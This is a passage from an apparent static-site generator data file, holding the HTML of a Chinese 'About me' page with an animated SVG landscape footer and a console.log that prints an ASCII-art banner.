console.log('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*;  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n**;         $$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n             $$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n              ;$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n                $$$$$$$$$*              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$                ;$$$$$$*             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$*                $$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$;               !$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$                             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$o                          ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$                        ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$                     ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!   o$$$$\\n$$$$$$$$$$$$;                  *$$$$$$$$$$$$$$$$o                       ;$$$$\\n$$$$$$$$$$$$$$                $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              ;$$$$$$!                              ;o$$$$$$$\\n$$$$$$$$$$$$$$$$               $$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$*              $$$$$$$              o$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$!            ;;$$$$$$$                                ;$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 $$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                          ;!$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              *$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              ;$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$');\n    </script>\n  </body>\n</html>\n","source":"about/index.html","raw":"---\nlayout: false\n---\n<!doctype html>\n<html lang=\"\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n    <title>关于我</title>\n\n    <!-- build:css styles/main.css -->\n    <link rel=\"stylesheet\" href=\"styles/main.css\">\n    <!-- endbuild -->\n\n  </head>\n  <body>\n    <div class=\"container\">\n      <div class=\"content\">\n        <canvas id=\"universe\"></canvas>\n        <canvas id=\"canvas\"></canvas>\n        <div id=\"footer\" class=\"\">\n          <svg id=\"scene\" x=\"0px\" y=\"0px\" width=\"1600px\" height=\"315px\">\n              <path id=\"ground\" d=\"M0,316.4209c0,0,157.7119-35.416,469-56c7.3833-0.4883,23.7876-3.5488,31.3335-4.0166\n            c3.7681-0.2334,19.4302,0.9424,28.3335,0.3506c17.1494-1.1396,30.9072-4.2734,38.333-4.6836\n            c7.5972-0.4189,18.4058,0.3799,27.6665-0.9834c5.7075-0.8408,10.1318-4.042,14.9248-4.2705\n            c7.8369-0.373,24.5693,3.6084,34.4087,4.2705c11.0586,0.7432,15.2656-1.8135,24.3335-2.1523c10.0576-0.376,20.4629,1.3867,28.6665,0\n            c3.5957-0.6074,4.4194,0.4209,7.7227-0.7715c1.4927-0.5391,5.8179-3.5693,6.9438-4.2432c3.8335,0.667,6.1426-1.0732,9.917-1.167\n            c2.2739-0.0566,3.9673-0.9072,6.249-0.9609c2.2725-0.0537,5.5547-1.2383,7.8345-1.2881c2.25-0.0498,3.498,1.0352,5.7554,0.9883\n            c2.9648-0.0615,7.9341,0.3164,10.9111,0.2607c2.2461-0.042,2.4976-0.5195,4.7505-0.5586c2.9663-0.0518,2.1045-0.5615,5.0825-0.6074\n            c1.5811-0.0244,6.9976,0.4131,8.582,0.3896c0.8887-0.0127,2.6113,0.373,3.5015,0.3604c1.5527-0.0215,2.2739-0.4404,3.8296-0.4609\n            c1.416-0.0186,2.0854-0.8555,3.5039-0.873c1.0835-0.0127,2.9155,0.7939,4.0005,0.7813c1.1104-0.0127,3.5542,0.4805,4.666,0.4688\n            c1.3047-0.0137,1.2773-0.5332,2.584-0.5459c1.415-0.0137,1.165-0.4414,2.5825-0.4541c0.916-0.0078,3.499,0.3984,4.416,0.3906\n            c1.499-0.0127,1.833,0.6221,3.3345,0.6104c1.3296-0.0098,3.8267-0.666,5.1587-0.6748c1.3335-0.0088,2.8389-0.6514,4.1743-0.6592\n            c1.3335-0.0078,2.4971,0.6191,3.8325,0.6123c2.5518-0.0127,7.3579,0.3965,9.9175,0.3877c5.3169-0.0176,5.5796-0.4063,10.9297-0.4063\n            c1.8379,0,6.7031,1.3184,8.3203,1.2402c2.1055-0.1016,3.7139-1.6572,5.5283-1.7969c3.9541-0.3037,7.3262-0.5732,10.5986-0.2598\n            c6.248,0.5977,12.1973-0.8125,21.207-0.7539c1.7266,0.0107,15.7813,3.085,17.5,3.0977c3.4014,0.0254,6.6191-1.3398,9.9971-1.3066\n            c4.1221,0.041,8.2275,1.2529,12.3369,1.3066c2.0752,0.0273,4.1543-1.1084,6.2314-1.0771c3.3662,0.0498,4.5547,1.0166,7.9346,1.0771\n            c2.1104,0.0381,6.4063-0.834,8.5264-0.792c2.7021,0.0537,4.4766-1.6729,7.2002-1.6113c2.9277,0.0654,7.6465,3.1641,10.6074,3.2393\n            c4.8359,0.123,8.8809-0.9854,13.832-0.8359c2.5029,0.0752,11.8818,2.0498,14.375,2.1289c1.8398,0.0586,2.499-1.2188,4.334-1.1582\n            c2.1689,0.0713,4.5049,1.209,6.666,1.2832c2.6699,0.0908,4.3398-0.916,6.998-0.8203c3.3379,0.1201,6.0566,1.3193,9.377,1.4453\n            c4.001,0.1514,4.7764-1.1602,8.75-1c3.1836,0.1289,16.834,1.9912,20,2.125c4.0059,0.1699,4.0029-0.9004,7.9814-0.7227\n            c6.8594,0.3076,7.9102,1.7656,14.6855,2.0977c8.916,0.4365,23.5254-0.2432,32.293,0.2344\n            c6.7168,0.3662,13.3896,0.7432,20.0186,1.1318C1458.8545,268.4941,1680,316.4209,1680,316.4209H0z\" />\n              <path id=\"stone1\" d=\"M680.3335,250.7549c7.3335,0.333,13.6665-1.2549,6-6.4609s-14.333-7.1221-18.6665,0.8359\n            S680.3335,250.7549,680.3335,250.7549z\" />\n              <path id=\"stone2\" d=\"M750.5,243.1709c3.25,0,2.5-3.707-1.75-4.2285s-5,3.7285-3,4.2285S750.5,243.1709,750.5,243.1709z\" />\n              <path id=\"stone3\" d=\"M988.4893,243.8242c2.8857,0.3467,4.8438,1.2627,3.0107-2.0703s-7.3955,1.3555-5.2031,1.7129\n            S988.4893,243.8242,988.4893,243.8242z\" />\n              <path id=\"stone4\" d=\"M697,248.9355c2.0142-0.2021,2.1665-2.0156,1-2.1816s-9.1543,1.8398-5.9937,2.6699S697,248.9355,697,248.9355z\" />\n              <g id=\"greens\" transform=\"translate(850, 180)\">\n                  <g>\n                      <path d=\"M36.3877,59.4268C33.0576,18.9482,6.4658,4.522,6.4658,4.522s22.4834,16.1426,24.4414,54.2251\n    C32.8657,96.8311,36.3877,59.4268,36.3877,59.4268z\" />\n                      <path d=\"M41.8496,83.1641C31.1572,43.98,2.3711,34.6738,2.3711,34.6738s25.063,11.7471,33.9668,48.8271\n    C45.2441,120.5791,41.8496,83.1641,41.8496,83.1641z\" />\n                      <path d=\"M31.3955,60.7207C23.7139,25.7979,2.5381,16.9541,2.5381,16.9541s18.4165,10.9277,24.7925,43.9502\n    C33.7061,93.9258,31.3955,60.7207,31.3955,60.7207z\" />\n                      <path d=\"M40.4517,62.0068C47.9473,21.6187,25.4009,0.1914,25.4009,0.1914s18.0098,21.9634,9.7896,59.6357\n    C26.9722,97.499,40.4517,62.0068,40.4517,62.0068z\" />\n                      <path d=\"M41.9414,69.4316c13.0313-38.9565-6.3218-63.3062-6.3218-63.3062s14.7856,24.251,1.4141,60.4185\n    C23.6621,102.709,41.9414,69.4316,41.9414,69.4316z\" />\n                      <path d=\"M29.4976,87.9092c27.4097-30.5938,19.2993-60.6226,19.2993-60.6226s3.958,28.1255-22.6606,56.0249\n    C-0.4775,111.2109,29.4976,87.9092,29.4976,87.9092z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;10;0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n                  <g>\n                      <path d=\"M34.9995,60.4189C56.0713,30.6665,46.1133,5.4014,46.1133,5.4014S52.2559,29.4746,31.6235,56.79\n    C10.9917,84.1035,34.9995,60.4189,34.9995,60.4189z\" />\n                      <path d=\"M36.3047,64.5391c28.4629-23.4443,25.3262-51.189,25.3262-51.189s-0.293,25.4971-27.6851,46.6538\n    C6.5552,81.1631,36.3047,64.5391,36.3047,64.5391z\" />\n                      <path d=\"M33.0449,70.502c31.4424-19.2637,32.1875-47.1748,32.1875-47.1748s-3.8291,25.208-33.897,42.3584\n    C1.271,82.833,33.0449,70.502,33.0449,70.502z\" />\n                      <path d=\"M13.8237,76.0244c36.5039-5.2158,48.2563-30.543,48.2563-30.543S48.5693,67.1045,14.168,70.9248\n    C-20.2324,74.749,13.8237,76.0244,13.8237,76.0244z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;15;0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-15,0;0,0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n              </g>\n              <g id=\"sign\" transform=\"translate(700, 180)\">\n                  <polygon points=\"21.2168,1.1143 20.6665,1.5459 19.7593,1.4473 19.229,1.4209 18.9707,1.6274 18.6665,1.9004 17.6865,1.9219\n    37.3516,87.8877 40.8828,87.0791   \" />\n                  <polygon points=\"45.4111,9.5537 2.4258,18.7158 1.563,18.498 1.4585,17.2114 0.8291,15.583 0.9165,14.3364 0.0908,12.6548\n    0.2085,12.0864 -0.1924,11.5308 -0.3296,9.271 43.3408,-0.0376 43.4766,0.5015 43.334,0.9629 43.6533,1.2046 43.8232,1.8784\n    43.8965,2.7754 44.2217,3.459 44.625,5.0576 45.041,7.5459 45.2637,7.5962 45.6191,9.0073  \" />\n                  <polygon points=\"47.0078,20.8545 4.2368,29.5503 3.5933,28.5903 3.3965,26.9746 2.4683,24.5137 2.8398,24.1372 2.2676,23.7847\n    1.9834,22.7563 2.2417,22.3394 1.7388,21.8706 1.2627,20.1426 44.8281,11.2852 45.082,12.4014 45.0723,12.9517 45.3281,13.481\n    45.752,15.3369 46.0273,17.7524 46.4219,18.2803  \" />\n                  <polygon points=\"47.666,31.168 4.7803,39.4023 4.251,37.4004 4.4429,36.1895 3.6465,35.1123 3.0142,32.7178 3.2754,32.1025\n    2.7461,31.7046 2.2676,29.8945 45.9268,21.5107 46.0762,22.2007 45.9512,22.8423 46.2783,23.1372 46.6777,24.9795 46.5234,25.4795\n    47.3027,27.8667 47.8086,30.2017   \" />\n              </g>\n              <g id=\"boy_1_\">\n                  <g id=\"boy\">\n                      <path d=\"M800.7324,167.6929c0,0-7.9688-6.5039-9.7197-8.041c-1.751-1.5366-7.9331-6.5039-8.7197-13.0435\n    c-0.7861-6.5396,6.0752-15.188,17.7969-16.1885c11.7207-1.0005,12.9727,1.0366,14.1514,2.7163\n    c1.1787,1.6792,5.7178,11.1494,5.0752,18.6538c-0.6445,7.5049-5.6826,10.1133-9.7559,13.3652\n    C805.4863,168.4072,800.7324,167.6929,800.7324,167.6929z\" />\n                      <path d=\"M810.7031,169.2109c-1.0723-1.3037-1.3574-2.9556-1.1426-4.0645c0.2139-1.1084-8.041,0.1128-8.8281,2.542\n    c1.6445,1.6787,0.751,3.146-0.5,4.1108c-1.25,0.9648-1.6797,1.502-1.9297,1.8237c0.0361,0.5361,0,0.9653,0,0.9653\n    s-1.4297,1.7153-2.2871,6.5396s-0.6787,6.79-0.9648,8.3267c-0.2852,1.5366-1.4648,5.9678-1.751,10.292s0,4.5742,0,4.5742\n    s1.251,1.7153,1.1436,4.0742s-1.2705,5.6099-1.2705,5.6099s0.2344,1.8945,1.8779,2.252c1.6445,0.3574,2.3594-0.6436,2.3594-0.6436\n    s1.0713,1.3223,1.75,4.0742c0.6797,2.752,0.6436,6.79,1.8945,7.9688c1.251,1.1797,1.6074,0.3223,1.6074,0.3223\n    s0.4648,3.3975-0.9277,6.6855c-1.3945,3.2881-4.1465,6.7568-4.1465,6.7568h11.0781c0,0,1.5723-3.5234-7.1113-2.2363\n    c3.252-4.0742,3.8955-6.1934,4.0391-11.125c1.8223,0.5,4.252,0.6738,4.9316-0.3271c0.5352,1.3223,2.4297,2.1787,3.3584,1.7139\n    c-0.2139,3.7168-1.0713,12.1846-1.0713,12.1846l9.0049,0.2852c0,0-0.751-3.2168-6.29-1.4307\n    c1.001-6.7891,1.3584-11.5068,1.3584-11.5068s1.3584,0.1074,1.8584-0.3926c0.5-0.501,0.6787-5.3252-0.4648-9.9346\n    c-1.1436-4.6104-0.5-4.4678-0.5-4.4678s1.75-0.8213,1.5-2.8584s-0.8574-3.6807-1.5352-5.5391\n    c0.4639-0.1074,1-0.7861-0.6797-2.7158c-0.2148-2.5015-0.9648-6.3242-0.6436-7.6465s0.2148-2.8232-0.1787-4.3599\n    c0-2.4302,0.7148-13.1509-1.25-17.0103c-1.9658-3.8594-2.5371-3.5737-2.5371-3.5737S812.5977,169.0142,810.7031,169.2109z\" />\n                  </g>\n                  <g transform=\"translate(783, 122)\">\n                      <g>\n                          <path d=\"M35.3506,17.9644c2.9834-3.71,5.9824-15.2095-3.1846-18.3765c2.668,3.833,1.168,5.6665,1.168,5.6665\n    S32,1.2549,28.666-0.4121c1.5,3.1665,0,5,0,5S20.5,8.9209,24.5,13.2544S35.3506,17.9644,35.3506,17.9644z\" />\n                          <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;30;0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                          <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      </g>\n                      <g>\n                          <path d=\"M27.125,6.2334c-1.8125-0.625-2.0625-1.9375-4.375-2.25c1,0.8125,1.125,1.6875,1.125,1.6875S21.5,4.3584,19.0625,3.9834\n    c1.3125,0.75,2,1.875,2,1.875s-3.25-0.75-5.875-0.75c1.125,0.3125,1.125,0.6875,1.125,0.6875S10.75,5.8584,8.6875,7.4834\n    c1,0.125,0.9375,0.6714,0.9375,0.6714s-4.25,1.5786-5.375,3.7661c0.875-0.4375-0.8125,1.8125-0.8125,1.8125s0.75,1.375-0.3125,1.125\n    S0.5,14.1084,0.5,12.5459c-0.5,2.1875,0.6924,2.5767,1.4375,3.3125c-0.0625,1-0.9375,2.6494-1.25,2.106s0.8594,0.4282,0.0547,2.4731\n    c-0.8047,2.0459-1.1533,3.7432-0.5103,6.5195s2.7056,4.5264,3.5181,6.2139s0.5-1.6875,0.5-1.6875L27.125,6.2334z\" />\n                      </g>\n                  </g>\n              </g>\n          </svg>\n        </div>\n      </div>\n    </div>\n    <!-- build:js scripts/main.js -->\n    <script src=\"scripts/universe.js\"></script>\n    <script src=\"scripts/main.js\"></script>\n    <!-- endbuild -->\n    <script>\n    console.log('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*;  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n**;         $$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n             $$$$$$$$$$$$$$;              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n              ;$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n                $$$$$$$$$*              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$                ;$$$$$$*             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$*                $$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$;               !$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$                             ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$o                          ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$                        ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$                     ;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!   o$$$$\\n$$$$$$$$$$$$;                  *$$$$$$$$$$$$$$$$o                       ;$$$$\\n$$$$$$$$$$$$$$                $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              $$$$$$$                                    $$$$\\n$$$$$$$$$$$$$$$$              ;$$$$$$!                              ;o$$$$$$$\\n$$$$$$$$$$$$$$$$               $$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$*              $$$$$$$              o$$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              $$$$$$$               $$$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$              ;$$$$$$$                                $$$$$$\\n$$$$$$$$$$$$$$$$$!            ;;$$$$$$$                                ;$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 $$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                          ;!$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              *$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              ;$$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$\\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$               $$$$$$$$$$$$$$$$$$$$$');\n    </script>\n  </body>\n</html>\n","date":"2017-03-08T19:05:11.000Z","updated":"2017-03-08T19:05:11.000Z","path":"about/index.html","title":"","comments":1,"_id":"cj2mm9xn900015es5e8l1o99z","content":"<!doctype html>\n<html lang=\"\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n    <title>关于我</title>\n\n    <!-- build:css styles/main.css -->\n    <link rel=\"stylesheet\" href=\"styles/main.css\">\n    <!-- endbuild -->\n\n  </head>\n  <body>\n    <div class=\"container\">\n      <div class=\"content\">\n        <canvas id=\"universe\"></canvas>\n        <canvas id=\"canvas\"></canvas>\n        <div id=\"footer\" class=\"\">\n          <svg id=\"scene\" x=\"0px\" y=\"0px\" width=\"1600px\" height=\"315px\">\n              <path id=\"ground\" d=\"M0,316.4209c0,0,157.7119-35.416,469-56c7.3833-0.4883,23.7876-3.5488,31.3335-4.0166\n            c3.7681-0.2334,19.4302,0.9424,28.3335,0.3506c17.1494-1.1396,30.9072-4.2734,38.333-4.6836\n            c7.5972-0.4189,18.4058,0.3799,27.6665-0.9834c5.7075-0.8408,10.1318-4.042,14.9248-4.2705\n            c7.8369-0.373,24.5693,3.6084,34.4087,4.2705c11.0586,0.7432,15.2656-1.8135,24.3335-2.1523c10.0576-0.376,20.4629,1.3867,28.6665,0\n            c3.5957-0.6074,4.4194,0.4209,7.7227-0.7715c1.4927-0.5391,5.8179-3.5693,6.9438-4.2432c3.8335,0.667,6.1426-1.0732,9.917-1.167\n            c2.2739-0.0566,3.9673-0.9072,6.249-0.9609c2.2725-0.0537,5.5547-1.2383,7.8345-1.2881c2.25-0.0498,3.498,1.0352,5.7554,0.9883\n            c2.9648-0.0615,7.9341,0.3164,10.9111,0.2607c2.2461-0.042,2.4976-0.5195,4.7505-0.5586c2.9663-0.0518,2.1045-0.5615,5.0825-0.6074\n            c1.5811-0.0244,6.9976,0.4131,8.582,0.3896c0.8887-0.0127,2.6113,0.373,3.5015,0.3604c1.5527-0.0215,2.2739-0.4404,3.8296-0.4609\n            c1.416-0.0186,2.0854-0.8555,3.5039-0.873c1.0835-0.0127,2.9155,0.7939,4.0005,0.7813c1.1104-0.0127,3.5542,0.4805,4.666,0.4688\n            c1.3047-0.0137,1.2773-0.5332,2.584-0.5459c1.415-0.0137,1.165-0.4414,2.5825-0.4541c0.916-0.0078,3.499,0.3984,4.416,0.3906\n            c1.499-0.0127,1.833,0.6221,3.3345,0.6104c1.3296-0.0098,3.8267-0.666,5.1587-0.6748c1.3335-0.0088,2.8389-0.6514,4.1743-0.6592\n            c1.3335-0.0078,2.4971,0.6191,3.8325,0.6123c2.5518-0.0127,7.3579,0.3965,9.9175,0.3877c5.3169-0.0176,5.5796-0.4063,10.9297-0.4063\n            c1.8379,0,6.7031,1.3184,8.3203,1.2402c2.1055-0.1016,3.7139-1.6572,5.5283-1.7969c3.9541-0.3037,7.3262-0.5732,10.5986-0.2598\n            c6.248,0.5977,12.1973-0.8125,21.207-0.7539c1.7266,0.0107,15.7813,3.085,17.5,3.0977c3.4014,0.0254,6.6191-1.3398,9.9971-1.3066\n            c4.1221,0.041,8.2275,1.2529,12.3369,1.3066c2.0752,0.0273,4.1543-1.1084,6.2314-1.0771c3.3662,0.0498,4.5547,1.0166,7.9346,1.0771\n            c2.1104,0.0381,6.4063-0.834,8.5264-0.792c2.7021,0.0537,4.4766-1.6729,7.2002-1.6113c2.9277,0.0654,7.6465,3.1641,10.6074,3.2393\n            c4.8359,0.123,8.8809-0.9854,13.832-0.8359c2.5029,0.0752,11.8818,2.0498,14.375,2.1289c1.8398,0.0586,2.499-1.2188,4.334-1.1582\n            c2.1689,0.0713,4.5049,1.209,6.666,1.2832c2.6699,0.0908,4.3398-0.916,6.998-0.8203c3.3379,0.1201,6.0566,1.3193,9.377,1.4453\n            c4.001,0.1514,4.7764-1.1602,8.75-1c3.1836,0.1289,16.834,1.9912,20,2.125c4.0059,0.1699,4.0029-0.9004,7.9814-0.7227\n            c6.8594,0.3076,7.9102,1.7656,14.6855,2.0977c8.916,0.4365,23.5254-0.2432,32.293,0.2344\n            c6.7168,0.3662,13.3896,0.7432,20.0186,1.1318C1458.8545,268.4941,1680,316.4209,1680,316.4209H0z\"/>\n              <path id=\"stone1\" d=\"M680.3335,250.7549c7.3335,0.333,13.6665-1.2549,6-6.4609s-14.333-7.1221-18.6665,0.8359\n            S680.3335,250.7549,680.3335,250.7549z\"/>\n              <path id=\"stone2\" d=\"M750.5,243.1709c3.25,0,2.5-3.707-1.75-4.2285s-5,3.7285-3,4.2285S750.5,243.1709,750.5,243.1709z\"/>\n              <path id=\"stone3\" d=\"M988.4893,243.8242c2.8857,0.3467,4.8438,1.2627,3.0107-2.0703s-7.3955,1.3555-5.2031,1.7129\n            S988.4893,243.8242,988.4893,243.8242z\"/>\n              <path id=\"stone4\" d=\"M697,248.9355c2.0142-0.2021,2.1665-2.0156,1-2.1816s-9.1543,1.8398-5.9937,2.6699S697,248.9355,697,248.9355z\"/>\n              <g id=\"greens\" transform=\"translate(850, 180)\">\n                  <g>\n                      <path d=\"M36.3877,59.4268C33.0576,18.9482,6.4658,4.522,6.4658,4.522s22.4834,16.1426,24.4414,54.2251\n    C32.8657,96.8311,36.3877,59.4268,36.3877,59.4268z\"/>\n                      <path d=\"M41.8496,83.1641C31.1572,43.98,2.3711,34.6738,2.3711,34.6738s25.063,11.7471,33.9668,48.8271\n    C45.2441,120.5791,41.8496,83.1641,41.8496,83.1641z\"/>\n                      <path d=\"M31.3955,60.7207C23.7139,25.7979,2.5381,16.9541,2.5381,16.9541s18.4165,10.9277,24.7925,43.9502\n    C33.7061,93.9258,31.3955,60.7207,31.3955,60.7207z\"/>\n                      <path d=\"M40.4517,62.0068C47.9473,21.6187,25.4009,0.1914,25.4009,0.1914s18.0098,21.9634,9.7896,59.6357\n    C26.9722,97.499,40.4517,62.0068,40.4517,62.0068z\"/>\n                      <path d=\"M41.9414,69.4316c13.0313-38.9565-6.3218-63.3062-6.3218-63.3062s14.7856,24.251,1.4141,60.4185\n    C23.6621,102.709,41.9414,69.4316,41.9414,69.4316z\"/>\n                      <path d=\"M29.4976,87.9092c27.4097-30.5938,19.2993-60.6226,19.2993-60.6226s3.958,28.1255-22.6606,56.0249\n    C-0.4775,111.2109,29.4976,87.9092,29.4976,87.9092z\"/>\n                      <animatetransform attributename=\"transform\" type=\"skewX\" values=\"0;10;0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                      <animatemotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatcount=\"indefinite\">\n                  </animatemotion></animatetransform></g>\n                  <g>\n                      <path d=\"M34.9995,60.4189C56.0713,30.6665,46.1133,5.4014,46.1133,5.4014S52.2559,29.4746,31.6235,56.79\n    C10.9917,84.1035,34.9995,60.4189,34.9995,60.4189z\"/>\n                      <path d=\"M36.3047,64.5391c28.4629-23.4443,25.3262-51.189,25.3262-51.189s-0.293,25.4971-27.6851,46.6538\n    